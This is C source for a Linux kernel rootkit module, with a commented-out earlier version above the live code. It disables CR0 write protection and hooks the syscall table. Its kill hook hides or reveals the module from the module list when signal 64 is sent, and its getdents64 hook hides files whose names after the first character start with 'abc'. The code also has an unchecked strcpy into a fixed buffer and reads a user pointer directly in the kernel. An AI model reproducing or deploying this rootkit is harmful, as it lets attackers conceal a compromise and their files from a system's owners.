// #include <linux/init.h>
// #include <linux/module.h>
// #include <linux/kernel.h>
// #include <linux/syscalls.h>
// #include <linux/kallsyms.h>
// #include <linux/version.h>
// #include <asm/special_insns.h>
// #include <asm/processor-flags.h>
// #include <asm/unistd.h>


// MODULE_LICENSE("GPL");

// /* After Kernel 4.17.0, the way that syscalls are handled changed
//  * to use the pt_regs struct instead of the more familiar function
//  * prototype declaration. We have to check for this, and set a
//  * variable for later on */
// #if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
// #define PTREGS_SYSCALL_STUBS 1
// #endif

// #ifdef pr_fmt
// #undef pr_fmt
// #endif
// #define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

// typedef long (*sys_call_ptr_t)(const struct pt_regs *);

// /* We need these for hiding/revealing the kernel module */
// static struct list_head *prev_module;
// static short hidden = 0;

// static sys_call_ptr_t *real_sys_call_table;
// static sys_call_ptr_t orig_kill;

// static unsigned long sys_call_table_addr;
// module_param(sys_call_table_addr, ulong, 0);
// MODULE_PARM_DESC(sys_call_table_addr, "Address of sys_call_table");



// static long hook_kill(const struct pt_regs *regs)
// {
//     void showme(void);
//     void hideme(void);

//     // pid_t pid = regs->di;
//     int sig = regs->si;

//     if ( (sig == 64) && (hidden == 0) )
//     {
//         printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
//         hideme();
//         hidden = 1;
//     }
//     else if ( (sig == 64) && (hidden == 1) )
//     {
//         printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
//         showme();
//         hidden = 0;
//     }
//     else
//     {
//         return orig_kill(regs);
//     }
//     return 0;
// }

// static void write_cr0_unsafe(unsigned long val)
// {
//     asm volatile("mov %0,%%cr0": "+r" (val) : : "memory");
// }

// /* Add this LKM back to the loaded module list, at the point
//  * specified by prev_module */
// void showme(void)
// {
//     list_add(&THIS_MODULE->list, prev_module);
// }

// /* Record where we are in the loaded module list by storing
//  * the module prior to us in prev_module, then remove ourselves
//  * from the list */
// void hideme(void)
// {
//     prev_module = THIS_MODULE->list.prev;
//     list_del(&THIS_MODULE->list);
// }


// /* Module initialization function */
// static int __init modinit(void)
// {
//     unsigned long old_cr0;

//     real_sys_call_table = (typeof(real_sys_call_table))sys_call_table_addr;

//     pr_info("init\n");

//     old_cr0 = read_cr0();
//     write_cr0_unsafe(old_cr0 & ~(X86_CR0_WP));

//     orig_kill = real_sys_call_table[__NR_kill];
//     real_sys_call_table[__NR_kill] = hook_kill;

//     write_cr0_unsafe(old_cr0);
//     pr_info("init done\n");

//     return 0;
// }

// static void __exit modexit(void)
// {
//     unsigned long old_cr0;

//     pr_info("exit\n");

//     old_cr0 = read_cr0();
//     write_cr0_unsafe(old_cr0 & ~(X86_CR0_WP));

//     real_sys_call_table[__NR_kill] = orig_kill;

//     write_cr0_unsafe(old_cr0);

//     pr_info("goodbye\n");
// }

// module_init(modinit);
// module_exit(modexit);

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/special_insns.h>
#include <asm/processor-flags.h>
#include <asm/unistd.h>

#ifdef pr_fmt
#undef pr_fmt
#endif
#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

typedef long (*sys_call_ptr_t)(const struct pt_regs *);

static sys_call_ptr_t *real_sys_call_table;
static sys_call_ptr_t original_getdents64;
static sys_call_ptr_t orig_kill;

static struct list_head *prev_module;
static short hidden = 0;

static unsigned long sys_call_table_addr;
module_param(sys_call_table_addr, ulong, 0);
MODULE_PARM_DESC(sys_call_table_addr, "Address of sys_call_table");

struct linux_dirent64 {
    unsigned long long d_ino;
    long long           d_off;
    unsigned short      d_reclen;
    char                d_name[];
};

static long hook_kill(const struct pt_regs *regs)
{
    void showme(void);
    void hideme(void);

    // pid_t pid = regs->di;
    int sig = regs->si;

    if ( (sig == 64) && (hidden == 0) )
    {
        printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
        hideme();
        hidden = 1;
    }
    else if ( (sig == 64) && (hidden == 1) )
    {
        printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
        showme();
        hidden = 0;
    }
    else
    {
        return orig_kill(regs);
    }
    return 0;
}

void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

/* Record where we are in the loaded module list by storing
 * the module prior to us in prev_module, then remove ourselves
 * from the list */
void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;

    list_del(&THIS_MODULE->list);

}


// Since Linux v5.3, [native_]write_cr0 won't change "sensitive" CR0 bits.
static void write_cr0_unsafe(unsigned long val)
{
    asm volatile("mov %0,%%cr0": "+r" (val) : : "memory");
}
void removeString (char text[], int index, int rm_length)
{
    int i;

    for ( i = 0; i < index; ++i )
        if ( text[i] == '\0' )
            return;

    for ( ; i < index + rm_length; ++i )
        if ( text[i] == '\0' ) {
            text[index] = '\0';
            return;
        }

    do {
        text[i - rm_length] = text[i];
    } while ( text[i++] != '\0' );
}
static long my_getdents64(const struct pt_regs *regs)
{
    long ret = original_getdents64(regs);
    struct linux_dirent64 *dirent;
    struct linux_dirent64 *prev_dirent = NULL;
    int offset = 0;
    char temp[100];
    if (ret <= 0)
        return ret;
    while (offset < ret) {
        dirent = (struct linux_dirent64 *)((char *)regs->si + offset);
        strcpy(temp,dirent->d_name);
        removeString(temp,0,1);
        if (strncmp(temp, "abc",3) == 0) {
            if (prev_dirent){
                prev_dirent->d_reclen += dirent->d_reclen;
                offset += dirent->d_reclen; // Skip the entry
                ret -= dirent->d_reclen;
                }
            else{
                //dirent = (struct linux_dirent64 *)((char *)dirent + dirent->d_reclen);
             offset += dirent->d_reclen;    
             ret -= dirent->d_reclen;
        	}
        }
        else {
            prev_dirent = dirent;
            offset += dirent->d_reclen;
        }
    }	
    return ret;
}

static int __init modinit(void)
{
    unsigned long old_cr0;

    real_sys_call_table = (typeof(real_sys_call_table))sys_call_table_addr;

    pr_info("init\n");

    old_cr0 = read_cr0();
    write_cr0_unsafe(old_cr0 & ~(X86_CR0_WP));

    original_getdents64 = real_sys_call_table[__NR_getdents64];
    real_sys_call_table[__NR_getdents64] = my_getdents64;

    orig_kill = real_sys_call_table[__NR_kill];
    real_sys_call_table[__NR_kill] = hook_kill;

    write_cr0_unsafe(old_cr0);
    pr_info("init done\n");

    return 0;
}

static void __exit modexit(void)
{
    unsigned long old_cr0;

    pr_info("exit\n");

    old_cr0 = read_cr0();
    write_cr0_unsafe(old_cr0 & ~(X86_CR0_WP));

    real_sys_call_table[__NR_getdents64] = original_getdents64;
    real_sys_call_table[__NR_kill] = orig_kill;

    write_cr0_unsafe(old_cr0);

    pr_info("goodbye\n");
}

module_init(modinit);
module_exit(modexit);

MODULE_LICENSE("GPL");
